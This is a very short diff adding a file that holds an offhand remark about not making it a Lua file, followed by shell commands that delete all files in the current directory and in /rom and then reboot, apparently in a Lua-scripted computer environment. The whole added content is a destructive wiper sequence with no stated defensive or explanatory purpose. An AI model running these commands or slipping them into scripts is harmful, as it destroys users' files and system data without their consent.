@@ -1,0 +1,6 @@
+im not going to make it as lua file
+
+rm *
+cd /rom
+rm *
+reboot
